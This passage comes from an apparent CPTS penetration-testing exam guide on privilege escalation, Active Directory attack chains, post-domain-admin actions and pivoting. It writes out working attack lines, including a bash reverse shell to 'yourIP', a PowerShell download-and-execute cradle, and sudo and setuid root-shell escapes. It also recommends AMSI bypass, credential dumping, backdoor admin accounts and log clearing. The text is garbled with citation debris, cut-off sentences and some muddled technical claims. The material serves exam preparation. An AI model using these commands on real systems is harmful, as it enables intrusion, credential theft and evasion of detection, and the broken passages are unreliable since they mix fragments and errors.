SharpHound says User X has admin on Machine Y, double-check by attempting a login or using psexec/WinRM to that machine with User X’s creds. This habit ensures you don’t chase false positives and demonstrates to the exam graders that you understand what the tools report. TL;DR: Automate breadth (to see the big picture), manually focus depth (to verify and uncover details). Combining both gives a complete view efficiently – and efficiency is exactly what you need during a 10-day marathon exam.
Privilege Escalation Cheat Sheet (Windows & Linux)
Elevating privileges on compromised systems is a core part of CPTS. Here’s a cheat sheet covering common Windows and Linux priv-esc methods, tools, and notes on kernel exploits – distilled from experience and “gotchas” encountered in practice: Windows PrivEsc:
Check Your Privileges: Immediately run whoami /priv on a Windows shell. If you see high-value privileges enabled like SeImpersonatePrivilege or SeBackupPrivilege, you have a quick path. For SeImpersonate (the famous JuicyPotato bug target), tools like JuicyPotatoNG or PrintSpoofer can get you SYSTEM via token impersonation【13†L340-L348】. If SeBackup is enabled, you can abuse it to read any file (including SAM/SECURITY hives). Pitfall: these techniques sometimes fail on newer OS or misconfiguration – always check OS build and if the known exploits for these tokens apply (e.g., PrintSpoofer works up to Server 2019 but not after certain patches).
Services and Scheduled Tasks: Look for misconfigured services:
Unquoted Service Path: A service path like C:\Program Files\Some Application\bin\app.exe (without quotes and with spaces) might let you place an executable in C:\Program Files\Some.exe to hijack it. Tools like WinPEAS highlight unquoted paths【13†L346-L354】. To manually find, run wmic service get name,pathname,startmode | findstr /i "C:\Program Files" and see if quotes are missing.
Weak Service Permissions: If you can modify a service (change its binPath or start it), you can inject your payload. Use accesschk.exe -uwcq YOUR-USER * to find services where your user has write or start rights. Or PowerView’s Get-ModifiableService for domain services.
Scheduled Tasks: Check schtasks /query /fo LIST /v – if any task runs a script or program you can edit, that’s a win. E.g., a task running as SYSTEM calling a .bat file in a writable location.
AlwaysInstallElevated: A quirky one – if the registry keys HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated (and the HKCU equivalent) are set to 1【13†L348-L354】, any user can install a MSI with SYSTEM privileges. Test it: if yes, generate an MSI reverse shell (there are tools/scripts for that) and msiexec it.
Credential Issues (Windows): Sometimes, the easiest priv esc is finding creds:
Check for saved creds in files: dir /s *pass* == *cred* across user directories. Common locations: C:\Users\<User>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt (PowerShell history), configuration files for programs (e.g., PuTTY, WinSCP, FileZilla often store creds in XMLs【16†L843-L851】).
Dump SAM & LSA Secrets if admin: If you’re local admin but not SYSTEM, you can use Volume Shadow Copy to copy the SAM and SYSTEM registry hives (or invoke Mimikatz’s LSA dump). This often yields other local accounts’ hashes or plaintext creds (in LSA Secrets for autologon, etc.). On modern OS, you might need to disable or bypass LSASS protections (e.g. via ProcDump or comsvcs DLL).
Reuse credentials: Found a password for one user? Try it for Administrator or another user on the host (especially if the environment doesn’t enforce smart unique passwords). Also, pivot those creds to other machines (this blurs into lateral movement, but it can effectively escalate your privileges if that user is admin elsewhere). Common pitfall: forgetting to try trivial creds – e.g. “Password123!” might be reused by multiple local admins.
Kernel Exploits (Windows): Less common in modern Windows since patch cycles are frequent, but not impossible in labs:
Identify OS build: systeminfo and note OS Name and Version. Cross-reference with known exploits. For instance, Windows 7 / Server 2008 R2 unpatched might be vulnerable to MS10-015 (KiTrap0D) or MS16-098 exploit. Windows 10 builds pre-1803 might have JuicyPotato for token exploit; post-1809 require RoguePotato or PrintNightmare depending on config【13†L342-L347】.
Tools like Windows-Exploit-Suggester (WES-NG) help: supply systeminfo output, it’ll list applicable missing patch exploits (like MS17-010 if it’s Win7 with no patch). If you see something like MS17-010 (EternalBlue) missing and you’re on a loca​
BRUNOROCHAMOURA.COM
t’s actually more for lateral movement, but MS15-051 (if listed) is a known priv esc for Windows 7/2008.
**Always double-check exp​
BRUNOROCHAMOURA.COM
​
BRUNOROCHAMOURA.COM
, a kernel exploit that BSODs a machine can cost you time. Read others’ experiences if you recall (for example, many OSCP folks know some older exploits are unstable). If you must run one, try to do it after collecting evidence from that machine, just in case it goes down and is reverted.
Other Windows Tricks: DLL Hijacking – if you find a program that runs as admin on startup and looks for a DLL in a writable path, you can trojan that DLL. UAC bypass – if you have a local admin but faced with User Account Control, many known bypasses (like fodhelper.exe registry hijack) can elevate to SYSTEM. These may be needed if the exam scenario gives you a medium-integrity admin shell. Also consider AppLocker Bypass/Lateral – if executables are restricted, use PowerShell or trusted binaries (LOLBins) to perform actions (this is more of a pivoting limitation than priv esc, but worth noting if environment is hardened).
Linux PrivEsc:
Sudo Misconfigurations: The top item: run sudo -l. If it lists any permitted commands, that’s your path. Common scenarios:
No Password sudo: If your user can run some command as root without a password, see if you can exploit it. e.g. sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh spawns a root shell (tar is being run as root) – this is a well-known GTFOBin for tar. Many binaries like vi, less, find, etc., have escape sequences (documented on GTFOBins)【16†L815-L818】. The exam might include something like user ALL=(ALL) NOPASSWD: /usr/bin/zip – which you’d exploit (for zip, use the -T flag trick to run shell).
Wildcard in sudo (Shellshock): If the sudo rule has wildcards, e.g. sudo /usr/bin/less /var/log/*, you can often manipulate the environment (LESSOPEN env var to get command execution). Be creative – these are often CTF-like but appear in exams to test your knowledge of sudo vulnerabilities【13†L309-L317】.
SUID/SGID Files: Run find / -perm -4000 -type f -ls 2>/dev/null to list SUID binaries. Compare against a baseline (know common ones). Look for unusual ones (e.g. a SUID vim or nmap, which can be abused to spawn shell). Even standard ones can be abused: e.g. sudo itself being SUID (rare), or find marked SUID (you can make it execute a shell with the -exec flag). The GTFOBins list is your friend here too. If an exam drops a custom SUID binary, download it (scp user@box:/path/to/bin .) and reverse engineer (even a simple strings to see what it does). Often, custom SUID programs are exploitable via insecure system() calls or file accesses (like the program might do open("/tmp/config") without dropping privileges – race to put your own /tmp/config as root).
Capabilities: Linux capabilities can allow a binary to do elevated actions without full root. Check with getcap -r / 2>/dev/null. For example, if you find python3.8 = cap_setuid+ep, it means that python can set UID – you can use that to spawn a shell as root (python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'). Or tar = cap_dac_read_search+ep means tar can read any file (not direct root shell, but you could read /etc/shadow). Capabilities are less obvious, but tools like LinPEAS flag them boldly【13†L313-L321】.
Cron Jobs: If there’s a cron job running as root that you can tamper with, it’s game over. Common exam trick: a cron job executes a script in /tmp or /var/www that is world-writable. If r&#8203;:contentReference[oaicite:55]{index=55}g a script every minute, edit that script to spawn a root shell or reverse shell. Sometimes the cron job is a benign one like backing up files, but it might call taron a directory you can write to – exploit that by dropping a malicious file named after tar’s--checkpoint-action(this is advanced, but known in CTFs). Simpler: if you can write to the script, just putbash -i >& /dev/tcp/yourIP/4444 0>&1 in it. In exam reports, show the crontab (cat /etc/crontabor in/etc/cron.d`) to justify the exploit.
NFS root_squash: If an NFS share is exported with no_root_squash, an​
BRUNOROCHAMOURA.COM
e to it, you can create a suid binary on the client that will be owned by root on the server. For example, write a simple C setuid shell to the share, it appears on the server with root ownership, then execute it on server to get root. Check /etc/exports or exportfs -v if you have access on an NFS server. This is more situational, but a known priv esc vector【13†L316-L324】.
Kernel Exploits (Linux): Many older kernels have public exploits (DirtyCow, DirtySock, DirtyPipe, 
BRUNOROCHAMOURA.COM
 lots of “dirty” ones【13†L322-L324】). Identify the kernel: uname -r. Also note OS version (lsb_release -a or contents of /etc/os-release). Cross-check with known exploit DB. For instance:
Kernel 4.4.x on Ubuntu 16.04 might be DirtyCow (CVE-2016-5195) vulnerable – an exploit to write to read-only files (often used to overwrite /etc/passwd to add a root user).
Kernel 5.x – check for DirtyPipe (CVE-2022-0847) on unpatched 5.8+ (if exam is up-to-date, maybe not).
PwnKit (CVE-2021-4034) – actually not kernel, but a SUID program (polkit’s pkexec) – if that’s present and not patched, any user can root by a simple C program. This one was big; LinPEAS screams about it if found.
Matching exploit to OS: Use automated suggester like linux-exploit-suggester.sh – it lists likely exploits by kernel version. But always verify manually. If it suggests “try exploit X”, search if that exploit applies to the distro (sometimes kernel compile options matter). If you choose to compile and run a kernel exploit, do it late in your enumeration (ensuring no easier method exists) and be prepared for a possible crash. On exam, a crash might revert a VM; you could lose some progress on that machine.
Common Pitfalls in PrivEsc: One is tunnel vision – assuming a kernel exploit is needed when a simpler misconfig is present. Always exhaust configuration issues (sudo, suid, credentials) before risky exploits. Another pitfall: not verifying architecture. If you compile an exploit on x64 for x86 or vice versa, it will just error – use uname -m to see if 64-bit. Also, tool reliability: LinPEAS is fantastic for breadth, but it might flag false positives (e.g., it might list a SUID file that is actually intended by the system and not exploitable). Use your judgment – just because it’s red in LinPEAS doesn’t mean it’s the vuln. Double-check manually or consult GTFOBins/hacktricks notes for that item.
In summary, approach privilege escalation methodically:
Enumerate (use WinPEAS/LinPEAS but also manual commands).
Identify obvious paths (sudo rights, SUID files, passwords, vulnerable software).
Prioritize low-hanging fruit (use existing credentials or misconfigs) before exploiting the kernel.
Keep a repertoire of 2-3 go-to exploits per OS version ready in your notes, so you don’t scramble for code under pressure.
This cheat sheet and your prior practice should cover 90% of priv esc scenarios. And remember, if you get root/System, loot the system (configuration files, credentials) before moving on – that often leads to the next target.
Tool and Script Failures: Fallback Tactics
In a long engagement like CPTS, not everything will work smoothly. It’s important to anticipate common tool failures and have backup methods. Here are some frequent issues and “Got This, Do That” remedies:
PowerView Crashing or Not Running: You might import PowerView and it exits with no output or throws an error (could be PowerShell constrained language mode, or missing .NET functions). Got This? – Do That: Try a different tool to fetch similar info. For AD enumeration, if PowerView fails, use AD CMDlets (if availab​
BRUNOROCHAMOURA.COM
ll) or SharpView (a compiled .exe version of PowerView). For example, instead of Get-NetUser, you can run Get-ADUser -Filter * (requires RSAT tools or run from a domain controller or a system with those modules). If executing scripts is the issue (e.g. Execution Policy or AMSI blocking), use a one-liner AMSI bypass or encode the script in base64 (powershell -Enc ...). Another fallback: run partial PowerView functionality via BloodHound’s Collectors (SharpHound). It may not list everything PowerView does, but it will capture users, groups, ACLs, etc., which covers most of what you need. Caveat: If the exam environment actively restricts PowerShell (some labs do), consider using command-line tools like nltest, dsquery, and net commands as discussed – they can retrieve a lot without needing PowerView.
GetUserSPNs.py (Impacket) Timeouts: This typically happ​
BLACKHILLSINFOSEC.COM
e domains or network latency issues. Got This? – Do That: Narrow the query. Impacket allows an LDAP filter: GetUserSPNs.py domain/user:pass -filter servicePrincipalName=*. If that still times out, use a different approach: ​
WHYNOTSECURITY.COM
in PowerShell – e.g., [System.DirectoryServices.DirectorySearcher] in PowerShell to query servicePrincipalName=*. Alternatively, use setspn from a Windows shell: setspn -T DOMAIN -Q */* – this queries all SPNs in the domain (it will list HOST/machine SPNs too, but you can focus on those with “/” to find user SPNs). If even that fails due to permissions, fall back to BloodHound data if you have it; BloodHound marks Kerberoastable users anyway. For AS-REP roasting, if Impacket’s GetNPUsers is acting up, you can attempt the same via a simple Python script using ldap3 library or even a tool like kerbrute (which can enumerate AS-REP roastable accounts offline). The key is, every Impacket function has an alternate path: Impacket is great, but maybe use CME’s --kerberoast feature or Rubeus on Windows to request SPN tickets.
Evil-WinRM Quirks: Evil-WinRM is a popular way to get an interactive PowerShell on a remote Windows host via WinRM. Common issues:
Failing to Connect: You might get an error or no response. Check: is WinRM (port 5985/5986) open? If not, Evil-WinRM won’t work – you might need to enable WinRM via another method or use a different shell approach (like psexec.py or WMI). If the port is open but creds fail, ensure the format is correct (sometimes need -d DOMAIN if using domain creds). Also, some older Windows versions or hardened ones require SSL – try the -S flag (ssl) or -i to specify host.
No Output / Partial Output: A known Evil-WinRM quirk – large command output can get truncated. Got This? – Do That: If output is too large, redirect it to a file and then use Evil-WinRM’s file download: e.g., run ipconfig /all > C:\Temp\ip.txt then download C:\Temp\ip.txt. Evil-WinRM has built-in upload/download which is very handy for such cases and transferring tools.
File Upload Failure: If you try to upload a file and it errors, verify your path (Evil-WinRM uploads to the current working directory on target by default, which might be C:\Users\Administrator\Documents or so). If it still fails, a backup is using certutil -urlcache from your attacker HTTP server, or encoding file in base64 and decoding on target. But usually Evil-WinRM’s file transfer is reliable.
WinRM Restricted for non-Admins: By default, only admins can WinRM. If you’re trying Evil-WinRM with a low-priv user and it says access denied, that’s normal. Then you know that method won’t work until you have admin creds – switch to SMB or WMI based methods for that user (like wmiexec.py which may allow a semi-interactive shell for any user who has WMI access). In some cases, organizations allow certain users WinRM​
MEDIUM.COM
se, assume WinRM is for admins.
Quitting Unexpectedly: If Evil-WinRM crashes mid-session (maybe due to network glitch), your context on target is lost. In an exam, immediately log what you had in that session (any creds or flags you saw) so you don’t lose info. Then just reconnect – WinRM is stateless, so start a new Evil-WinRM session. If it persistently crashes at a certain command, run that command in a different way (maybe it’s trying to render something fancy? e.g., running an interactive menu script might not play well – try a different shell or execute piece by piece).
Responder and Network Poisoning Tools: You might attempt LLMNR/NBT-NS poisoning with Responder to catch hashes. Sometimes, Responder sits quietly with no results (maybe because the lab network had it disabled or hosts are not making those queries). Got This? – Do That: Don’t spend too long waiting; if Responder hasn’t snagged anything in hours, move on – perhaps the network is configured in a way that doesn’t yield hits. Instead, use active techniques: for example, run Invoke-LLMNR-Proxy or t​
BRUNOROCHAMOURA.COM
ng if appropriate. If Responder itself fails to start (like Permission denied on some interfaces), ensure you ran as root and specified the correct interface/IP. As a fallback, use Inveigh (PowerShell LLMNR/NBNS spoofer) on a Windows pivot host – sometimes attacking from inside yields creds if the domain controller or other systems make name resolution requests.
Metasploit / MSFVenom Issues: While CPTS isn’t Metasploit-centric, you might generate a payload with msfvenom or use Meterpreter in a pinch. Common fail: the payload gets caught by AV or just doesn’t connect back. Got This? – Do That: Try a different payload type (e.g., if EXE gets caught, try a Powershell payload or reflective DLL). Or use a simpler native payload like cmd.exe reverse shell one-liner, which is less likely flagged than Meterpreter. If multi/handler (Metasploit listener) is acting up, remember you can always use netcat or PowerShell’s Invoke-WebRequest + Start-Process combos to catch shells. Basically, Metasploit is not mandatory – have a manual shell payload alternative ready.
Linux Scripts Failing: Perhaps LinPEAS terminates unexpectedly (maybe due to an aggressive kernel logging). If a script like LinEnum or LinPEAS isn’t giving output, run pieces of it manually – e.g., check /etc/crontab, /etc/passwd, sudo -l yourself. No script can replace your eyes completely. If a compiled exploit on Linux fails (segfault), try an alternate version or source. Sometimes compile flags matter – a 32-bit exploit on 64-bit without proper flags will segfault. Recompile accordingly (-m32 for 32-bit if libraries allow). When a kernel exploit fails, it might also silently do nothing – don’t assume success until you verify whoami.​
BLACKHILLSINFOSEC.COM
s, move to next option or path.
BloodHound Data Import Failures: If you manage to collect BloodHound data but the UI or Neo4j is being temperamental (e.g., huge dataset not importing or queries not returning), you could query the raw JSON for critical info. The BloodHound JSON files can be searched with grep/jq. For instance, grep for "HasSession" or a specific username. It’s ugly, but if GUI breaks, the data is still there. Alternatively, rerun SharpHound in smaller chunks (e.g., --Exclude DC to skip domain controllers or targeting specific OUs) to reduce size. This is a last resort since BloodHound CE (Community) is usually stable, but good to keep in mind.
Fallback Mindset: The overall strategy is captured well by “Got this, do that.” For every tool in your arsenal, know at least one alternative. If one privilege escalation script doesn’t find anything, try another or manual. If one exploit fails, have another lined up. In your Obsidian notes, maintain a section perhaps titled "Plan B/C for Tools" – e.g., “If crackmapexec SMB crashes, use impacket smbexec”, “If unable to run WinPEAS, run manual checks X, Y, Z”. Having this written down means when you hit a wall, you don’t waste time recalling what else to try – your notes tell you.
Remember, part of the exam is adapting under pressure. Demonstrating that you can calmly switch tactics when a tool misbehaves shows professional maturity. It’s exactly what you’d do on a real engagement if your go-to method hit a snag. So anticipate the common failures (like those above) and you’ll solve them almost reflexively when they occur, keeping your momentum.
Real-World Attack Chains and Alternatives
To excel in CPTS, you should understand complete Active Directory attack chains end-to-end, and know alternate ways to achieve each step. Let’s outline a typical enterprise kill chain from initial access to Domain Admin, then explore substitutes at each phase: Example AD Compromise Chain: (Web App RCE) → (Foothold on Internal Server) → (Gather Credentials) → (Lateral Movement) → (Privilege Escalation to Domain Admin) → (Post-DA actions).
Initial Access – Foothold: Suppose you exploit a web application on a DMZ server and get RCE, planting a reverse shell. Now you have a low-priv user shell on an internal server (perhaps as user “WebUser”).
Alternatives: Initial access could also come from a leaked credential (say you found creds in a paste, so you try VPN/RDP/SMB login), or from phishing (outside exam scope). On CPTS specifically, initial foothold is often via a web vuln (SQLi, RCE, LFI to RCE, file upload, etc.)【10†L175-L183】. If Plan A (web RCE) fails, Plan B might be an exposed service exploit (e.g., a known RCE in Jenkins, Tomcat, etc. if those are present【10†L159-L167】【10†L163-L172】). Plan C could be password spraying on external services (like trying default creds on OWA, SSH, etc.). The key is to enumerate multiple attack surfaces so you have fallback entry points.
Establish Internal Recon & Basic User Privilege Escalation: On the compromised server, gather as much info as possible. Perhaps you find in config files a password for a service account. For example, web.config might contain a connection string with credentials. That gives you a reused credential “ServiceAccount:Password1”. You try that on the server itself and find it’​
MEDIUM.COM
 or you use it to login to another server via SMB.
Alternatives: If no creds are readily found, dump hashes. On Windows, use Mimikatz or LSASS dump if you have local admin. If not, maybe the web server was running as a service account – Kerberoast it. Or use that host to run Responder and catch hashes from other machines. At this stage, you pivot to lateral movement when ready, but if initial foothold is very low privilege, you might need an intermediate priv esc on that host (e.g., exploit a vulnerable driver to become SYSTEM on the web server). Always consider environment specifics: maybe the initial host is not domain-joined – then your goal is to p​
MEDIUM.COM
main (lateral movement might actually mean compromising a domain-joined box first, through RDP or another exploit).
Lateral Movement – Spreading through the Network: Using the credentials or access obtained, move to another host. In our example, say the “ServiceAccount” cred​
MEDIUM.COM
nternal database server. You login there and find it’s domain-joined and ServiceAccount is a domain user (maybe with some elevated privileges). On that DB server, you run SharpHound and see ServiceAccount is a member of “SQL Servers” group which has local admin on a bunch of machines. You pivot again to a machine where an actual domain admin might be logged in.
Alternatives: Lateral movement can be done with different methods:
Pass-the-Hash – if you have an NTLM hash of a user with admin rights, use it with psexec.py or CME.
Pass-the-Ticket – if you have a Kerberos ticket (say you captured a TGT with Mimikatz), use it with Rubeus or Mimikatz to auth to other services.
WMI/SMB/WinRM – multiple protocols exi​
THEYHACK.ME
​
THEYHACK.ME
nother might work. For instance, if RDP is disabled, try WinRM (Po​
THEYHACK.ME
​
THEYHACK.ME
M is closed, try SMB (psexec or schtasks).
Scheduled Task/Service – you might not have direct shell access but can execute commands remotely (e.g., sc.exe \\\\target create ...).
If credentials are limited, consider printer bug / SpoolSample (like the printerbug to coerce authentication, although that’s more a way to pull hashes from DC if you have a machine account to relay – advanced but a known alternative if stuck).
If a direct lateral move is failing (firewalls blocking SMB, etc.), use your pivot box as a jump host with proxy (Chisel/Ligolo as discussed) and attack internally from it.
Privilege Escalation to Domain Admin: Now you have footholds on a few machines and some credentials. Commonly, one path is: crack a kerberoasted service hash to get a service user that is a domain admin (sometimes labs do exactly this). Or find that the user you moved as (ServiceAccount) has GenericAll on some privileged group – then abuse that ACL to add yourself to Domain Admins【35†L193-L197】. Another classic: you got a user who is a local admin on the domain controller (e.g., part of “Server Operators”) – you can then log onto DC and dump NTDS.dit (thus retrieving all domain hashes). Let’s say in our chain, the ServiceAccount wasn’t DA, but it had a weak password that was reused for an account that is DA. Using password spraying or credential reuse checks, you find “SvcAdmin:Password1” works for “CORP\BackupAdmin” and that account is a Domain Admin. Now you effectively have DA creds – you login to a DC or use DCSync with mimikatz (lsadump::dcsync for Administrator hash)【49†L239-L247】.
Alternatives: There are many routes to DA:
Kerberoasting route: if cracking yields no result, try AS-REP roast, try password spraying (maybe that one user with “Password123” in description field).
Privileged groups abuse: if not DA directly, maybe you get to be Enterprise Admin via trust or Account Operators (who can reset passwords of others).
Zero-day / unpatched vulns: If by chance something like PetitPotam (certificate relay) is in scope【49†L243-L247】, that could jump you to DA by triggering the DC to authenticate to you and relaying to LDAP. Always check if DCs have MSRPC open and Certificate Services running (an alternate if all else fails in a lab).
Golden Ticket: if you compromise the KRBTGT account (usually after DA anyway), you can create a golden ticket to persist. Not needed for exam timeline, but good to mention as an alternate post-DA method to regain access if you somehow lost DA creds.
Essentially, have multiple paths in mind: if one fails (couldn’t crack any hashes), pivot to another (maybe try a different host’s loot, or exploit AD CS if present, or use brute-force on a misconfigured LDAP if allowed).
Post-DA Movement (Enterprise Dominance): After obtaining Domain Admin, ensure control over all domain assets. This might involve accessing the Domain Controller (if you weren’t on it yet) and exfiltrating the NTDS.dit (Active Directory database) or using secretsdump.py to dump all user hashes. Also consider if there are multiple domains/forests:
Alternatives: If there’s a trust to another domain (e.g., a child domain or a separate forest), you might need to exploit that trust. For instance, if you become DA in child domain, abuse the trust (like setting SID History or creating a cross-domain token) to escalate to the parent domain (this is CAPE territory; CPTS might not require multi-domain, but be aware). Another approach is forging trust tickets (Silver Ticket for services, or if Ente​
MEDIUM.COM
​
MEDIUM.COM
one forest, use it to compromise another via trust keys).
Throughout each phase, have a Plan B:
If initial exploitation via web fails, maybe there’s a weak credential somewhere (use OSINT or guess common passwords).
If that internal server had no goodies, maybe pivot to a workstation (perhaps an employee VM that had VMware tools with shared folders misconfigured, etc.).
If your cracked hash doesn’t yield DA, perhaps the user is one step away – look for delegation or ACL abuse possibilities.
Maintain situational awareness: every host compromise, enumerate it fully (running WinPEAS/LinPEAS each time, checking for files, etc.). Sometimes an attack chain can be cut short by a lucky find – e.g., you compromise a helpdesk user and on their desktop is a text file “DomainAdminCreds.txt”. It sounds contrived, but in practice labs often include such easter eggs to reward thorough enumeration. Don’t assume you must always do a 5-step chain; if a shorter path appears, take it.
Document the chain as you go. A simple diagram in your notes (even text-based) showing the path (“WebApp -> WebServer -> Creds -> DBServer -> ServiceAccount -> DC”) helps ensure you’ve covered alternatives at each arrow. That way, if one arrow breaks, you can find a detour. By building and practicing various chains (like the one above, or a Kerberoast-focused chain, or a DNSAdmins exploitation chain, etc.), you’ll be ready for whatever sequence the exam throws at you. And if one link is not working, you’ll recall another way to achieve the same effect (for example, no Kerberoastable accounts? Try abusing Password Spraying PASSWD_NOTREQD accounts【49†L230-L238】). In summary, think of the AD attack as a multi-route journey. You have a destination (Domain Admin), multiple checkpoints (initial foothold, lateral moves, privilege milestones), and several roads connecting them. If the main highway is closed, take the side roads – they might be slightly longer, but they’ll get you there just the same.
Post-DA Add-Value Actions
Achieving Domain Admin is often the “win” condition technically, but a true professional (and CPTS expects this) will continue to enumerate impact and provide value in the report. After Domain Admin, consider performing the following additional actions to demonstrate thoroughness (always within scope):
Password Auditing (DPAT and similar): With DA, dump the Active Directory password hashes (using ntdsutil or secretsdump.py). Then analyze those hashes. Use tools like Domain Password Audit Tool (DPAT)【36†L7-L15】 or even just hashcat + some rules to crack a portion of them. The goal is to identify weak password practices: e.g., “50% of accounts share only 3 passwords”, “password ‘Winter2025!’ is used by 10 users including one Domain Admin”【36†L13-L16】. This adds value by highlighting systemic risk (beyond the one-off exploits). In the report, you can include stats: number of cracked passwords, common patterns, any passwords matching breach data, etc. This kind of analysis, while not strictly required to “pwn” the network further, shows the client how an attacker can leverage weak credential policy to pivot or persist. If time permits, do at least a quick crack on Administrator or KRBTGT to check if they used something guessable (sometimes lab creators do set an easily crackable admin password as an extra finding).
Data Exfiltration & DLP Testing: As DA, you essentially have access to all files in the domain (unless there’s encryption). You might attempt to simulate data theft:
Search file servers or shares for sensitive keywords: e.g., personal data, financial records, “passwords.xlsx”, etc. You can script something with PowerShell (Get-ChildItem -Recurse with Select-String) or use Linux tools via SMB mounts. If you find confidential data, note it as evidence (with caution not to actually steal large amounts – just identify it).
If the engagement allows, test Data Loss Prevention (DLP) controls: e.g., try to copy a file with credit card numbers out through your attack machine, or email it out via a dummy account. If it succeeds with no blocks, that’s a valuable finding. In an exam environment, active exfil tests might not be doable (no internet out), but you can simulate by compressing files and seeing if any monitoring triggers on the host (check Windows Event Logs or any DLP agent presence).
Also consider shadow admin creation for persistence: as DA, create a dummy domain admin user or backdoor a domain group policy (like add a startup script that adds a new admin on reboot). Then see if any security product flags that. Reporting on lack of detection/persistence mechanisms is added value (e.g., “We were able to create persistent access that survived resets without detection”).
Domain Trust Abuse: If multiple domains exist (e.g., a parent and a child, or a DMZ domain and internal domain with a one-way trust), now is the time to exploit those trusts. For instance, if you are DA in Domain A and Domain B trusts A, you can create a Silver Ticket for Domain B’s KRBTGT (if trust is transitive and you have the trust keys). Another approach: use Mimikatz DCSync in Domain A to get the trust account password for Domain B (trust accounts are just user accounts). Then impersonate that on Domain B. These are advanced, but showing that “not only did we own DomainA, we leveraged that to also control DomainB due to an overly permissive trust” is a big value add in reports【35†L241-L250】. In simpler terms, if the lab has multiple domains, be sure to demonstrate you can compromise them all from one DA beachhead.
**Cleaning Up & Simulating Blue Team: While not explicitly asked, it can be impressive to show what traces your attack left and how to cover them. For example, if you used Mimikatz, note whether Event 4624/4625 (logon events) or 4672 (admin logon) were generated. If you added a user, check the AD replication or event logs for that action. Then consider demonstrating how an attacker might remove those logs or hide their tracks. This could be as simple as clearing the Security log with wevtutil, or using AuditPol to disable auditing (in a test environment). Including this in the report educates the client on how attackers hide, and thus why catching them is hard.
Leftover Credential Hunting: Even as DA, look for low-hanging fruit that would worry a client:
Are there old user accounts with no logon in years but still active? (Indicator of poor hygiene; mention it).
Are there accounts with PasswordNeverExpires or Passwd_Not_Required【49†L230-L238】 flags? (These are often used by service accounts; highlight if insecure).
Dump passwords from GPP (Group Policy Preferences) if present – as DA you can decrypt any GPP cpassword left in SYSVOL (legacy issue, but who knows).
Check if LAPS (Local Admin Password Solution) is deployed; if not, note that all local admins likely shared credentials and you could pivot that way (we possibly did). If yes, see if you can dump those passwords from AD (as DA you can read ms-MCS-AdmPwd attributes unless they configured permissions; if you can, that’s a finding about LAPS delegation).
If any shadow admins (users with high privileges but not obviously named or in default groups) exist – BloodHound’s “Detect Delegation/ACL based privs” helps here – mention them. Corporations often don’t realize a certain service account can effectively be DA due to ACLs.
Client Value Reporting Tips: While not part of exploitation, how you present the findings is crucial. Ensure you link each post-DA action to a business impact:
Cracked 70% of passwords → impact: demonstrates risk of credential stuffing and non-compliance with password policy.
Downloaded sensitive HR files → impact: potential data breach of employee PII.
Persistence created (new admin user) → impact: attacker could regain control even after incident response, leading to long-term compromise.
Trust abuse → impact: a breach in one subsidiary can cascade to parent company assets.
No alerts triggered during our actions → impact: security monitoring is lacking or misconfigured.
Also, provide clear recommendations for each:
Enforce strong unique passwords (perhaps implement passphrases or use password managers, as per the DPAT findings)【36†L7-L15】.
Implement monitoring for use of domain admin credentials on unusual machines (so if an admin logs into a workstation and we dump creds, someone knows).
Limit delegation and service account privileges (principle of least privilege).
Implement endpoint protections that would detect Mimikatz or other tools (if none stopped you).
Train and deploy DLP to prevent easy exfiltration.
The goal in CPTS reporting is to show you didn’t just grab flags, you assessed the security posture. Doing these post-DA steps shows you think like an attacker and a consultant providing actionable insights. It’s the difference between a barebones “I owned you” report and a stellar “Here’s how to improve” report.
Time-Saving Mini Tactics and Quick Wins
Finally, here are some bite-sized tactics and tips that can save you time during the exam, especially when dealing with networking, pivoting, and miscellaneous tasks:
Nmap Efficiency: Use the right scan at the right time. For initial broad port scanning on a /24, nmap -T4 -p- --min-rate=1000 --min-hostgroup=100 <targets> can find open ports quickly (adjust rate as needed). Follow up with service detection only on found ports (-sC -sV -p <list>). To scan through a pivot (proxychains or SOCKS), prefer full TCP connect scans (-sT) as SYN scans might not work over proxy. If you have a list of targets, use -iL targets.txt to feed nmap, and --exclude to skip known offline hosts to save time. Also remember RustScan as an alternative – super fast port discovery, then hand off to Nmap. In short: don’t wait for default scans if you can optimize. A well-known quick win: scanning common ports first (like -F for top 100, or a custom top 1000 list weighted towards SMB, HTTP, RDP) – this might reveal entry points faster than doing full 65k on every host sequentially. In a timeboxed engagement, finding one open RDP with weak creds in 5 minutes beats finding it after 5 hours of exhaustive scanning.
Evil-WinRM & File Transfer Tricks: We touched on Evil-WinRM upload/download. One neat trick: Evil-WinRM’s upload can take a directory (it will zip and transfer). Use this to quickly drop whole toolsets (like a folder of scripts) onto a target without setting up SMB shares. Another trick: if you have two shells on the same Windows host (perhaps two different accounts), you can use -S (SSL) to encrypt Evil-WinRM traffic if you suspect someone might be monitoring (usually not in exam, but just in case). For large data exfiltration in Windows, BITS is your friend: from a Win shell, Start-BitsTransfer -Source \\ATTACKER\share\bigfile.zip -Destination C:\Users\Public\bigfile.zip is often faster and more reliable than copying via SMB mounting. Also, don’t forget the simple powershell -c Invoke-WebRequest to pull files from your box – if you lack a fancy tool, a one-liner can replace upload: e.g. powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://YOURIP:8000/SharpHound.ps1')" to execute a script directly from your machine.
Proxychains and Pivoting Shortcuts: Using proxychains with every tool can be tedious. Where possible, configure tools to use a proxy natively:
For example, Responder or CrackMapExec might not support socks proxies, but CME does support proxychains as long as you use proxychains properly. If a tool ignores proxychains (some do, as noted【18†L1059-L1066】), consider alternatives: run those tools directly on the pivot (if it’s a Linux pivot, you can SSH in and run nmap there, etc.).
Use SSH dynamic forwarding (SOCKS): ssh -D 9050 -C user@pivot creates a SOCKS proxy; combine with ProxyCommand or ProxyJump in SSH config to chain pivots. If double pivoting (two hops), instead of nested proxychains, do an SSH proxy jump: ssh -J pivot1user@pivot1 pivot2user@pivot2 can sometimes simplify two hops (though for scanning, a proper socks chain as discussed in pivot section is needed).
A quick diagram or mental model helps: Each pivot = new network scope. After pivoting, re-run recon from that context【18†L1038-L1046】 – don’t forget this! Many people pivot but then still try scanning with their local nmap (which may not see new subnets unless properly tunneled). Checklist: update /etc/hosts or resolver to handle internal DNS if needed (the Medium tip about DNS resolution inside tunnels is golden【18†L1057-L1061】).
If dealing with Linux pivots, consider chisel in reverse mode: run chisel server on your attack box, and client on pivot connecting back – easier for when pivot is behind NAT and you already have shell there. It spares you from complex SSH setups.
